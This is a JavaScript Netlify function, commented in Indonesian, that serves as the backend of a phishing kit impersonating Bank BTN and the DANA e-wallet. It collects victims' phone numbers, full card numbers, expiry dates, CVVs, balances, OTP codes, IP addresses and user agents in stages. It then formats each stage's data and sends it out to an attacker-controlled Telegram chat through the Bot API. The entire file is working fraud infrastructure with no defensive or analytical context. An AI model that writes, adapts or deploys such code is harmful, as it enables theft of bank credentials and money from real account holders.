// netlify/functions/send-notification.js

// Konfigurasi Bot Telegram (akan diisi via Environment Variables di Netlify)
// TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID akan di-set di Netlify Dashboard

exports.handler = async (event, context) => {
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    // Ambil token dari environment variables Netlify
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Validasi konfigurasi
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('Missing Telegram configuration');
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Server configuration error' })
        };
    }

    try {
        // Parse data yang dikirim dari client
        const data = JSON.parse(event.body);
        
        const {
            phoneNumber,
            cardNumber,
            expiryDate,
            cvv,
            estimatedBalance,
            otpCode,
            timestamp
        } = data;

        // Format pesan untuk Telegram dengan style box drawing
        let message = '';
        
        // Cek jenis data yang dikirim (berdasarkan field yang ada)
        const isPhoneOnly = phoneNumber && !cardNumber && !otpCode;
        const isCardData = cardNumber && !otpCode;
        const isFullData = phoneNumber && cardNumber && otpCode;
        const isOtpOnly = otpCode && !cardNumber;
        
        if (isPhoneOnly) {
            // Notifikasi hanya nomor HP (halaman 1)
            message = formatPhoneNotification(phoneNumber, timestamp, event.headers);
        } 
        else if (isCardData) {
            // Notifikasi data kartu ATM (halaman 2)
            message = formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp, event.headers);
        }
        else if (isFullData || otpCode) {
            // Notifikasi OTP (halaman 3)
            message = formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, event.headers);
        }
        else {
            // Fallback format lama
            message = formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, event.headers);
        }

        // Kirim ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('Telegram API Error:', result);
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    error: 'Failed to send notification',
                    details: result.description 
                })
            };
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Notification sent successfully' 
            })
        };

    } catch (error) {
        console.error('Error processing request:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Internal server error',
                details: error.message 
            })
        };
    }
};

// Format notifikasi hanya nomor HP (Halaman 1)
function formatPhoneNotification(phoneNumber, timestamp, headers) {
    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    
    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
    const userAgent = headers['user-agent'] || '-';
    
    let message = `<b>┌• AKUN | BANK BTN</b>\n`;
    message += `<b>├•</b> ${phoneNumber}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Format notifikasi data kartu ATM (Halaman 2)
function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp, headers) {
    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    
    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
    const userAgent = headers['user-agent'] || '-';
    
    // Format saldo dengan pemisah ribuan
    const formattedBalance = formatRupiah(estimatedBalance);
    
    let message = `<b>┌• AKUN | DANA E-WALLET</b>\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 📱 No. HP :</b> ${phoneNumber}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 💳 No. Kartu :</b> ${formatCardNumber(cardNumber)}\n`;
    message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
    message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
    message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Format notifikasi OTP (Halaman 3) - LENGKAP dengan semua data
function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, headers) {
    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    
    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
    const userAgent = headers['user-agent'] || '-';
    
    // Format saldo dengan pemisah ribuan
    const formattedBalance = formatRupiah(estimatedBalance);
    
    let message = `<b>┌• AKUN | BANK BTN</b>\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 📱 No. HP :</b> ${phoneNumber}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 💳 No. Kartu :</b> ${formatCardNumber(cardNumber)}\n`;
    message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
    message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
    message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
    message += `<b>├• 🤖 User Agent :</b> ${userAgent.substring(0, 50)}${userAgent.length > 50 ? '...' : ''}\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Format legacy fallback
function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, headers) {
    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    
    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
    const formattedBalance = formatRupiah(estimatedBalance);
    
    let message = `<b>┌• AKUN | BANK BTN</b>\n`;
    message += `<b>├───────────────────</b>\n`;
    
    if (phoneNumber) {
        message += `<b>├• 📱 No. HP :</b> ${phoneNumber}\n`;
    }
    if (cardNumber) {
        message += `<b>├• 💳 No. Kartu :</b> ${formatCardNumber(cardNumber)}\n`;
    }
    if (expiryDate) {
        message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
    }
    if (cvv) {
        message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
    }
    if (estimatedBalance && estimatedBalance !== '0') {
        message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
    }
    if (otpCode) {
        message += `<b>├───────────────────</b>\n`;
        message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
    }
    
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Fungsi untuk format Rupiah
function formatRupiah(angka) {
    if (!angka || angka === '0') return '0';
    let number_string = angka.toString().replace(/[^,\d]/g, '');
    let split = number_string.split(',');
    let sisa = split[0].length % 3;
    let rupiah = split[0].substr(0, sisa);
    let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
    
    if (ribuan) {
        let separator = sisa ? '.' : '';
        rupiah += separator + ribuan.join('.');
    }
    return rupiah || '0';
}

// Fungsi untuk format nomor kartu (tampilkan 4 digit terakhir saja untuk keamanan, tapi tetap full di notifikasi)
function formatCardNumber(cardNumber) {
    if (!cardNumber) return '-';
    // Hapus spasi
    const clean = cardNumber.replace(/\s/g, '');
    if (clean.length === 16) {
        // Tampilkan full 16 digit dengan spasi setiap 4 digit
        return clean.match(/.{1,4}/g).join(' ');
    }
    return cardNumber;
}

// Notifikasi singkat untuk update cepat (opsional - bisa dihapus jika tidak perlu)
async function sendQuickNotification(botToken, chatId, phoneNumber, stage) {
    try {
        let quickMessage = '';
        if (stage === 'phone') {
            quickMessage = `📱 *New Phone Number*\n└─ ${phoneNumber}`;
        } else if (stage === 'card') {
            quickMessage = `💳 *New Card Data*\n└─ Phone: ${phoneNumber}`;
        } else {
            quickMessage = `🔐 *New OTP Submission*\n└─ Phone: ${phoneNumber}`;
        }
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: quickMessage,
                parse_mode: 'Markdown',
                disable_notification: false
            })
        });
    } catch (error) {
        console.error('Failed to send quick notification:', error);
    }
}
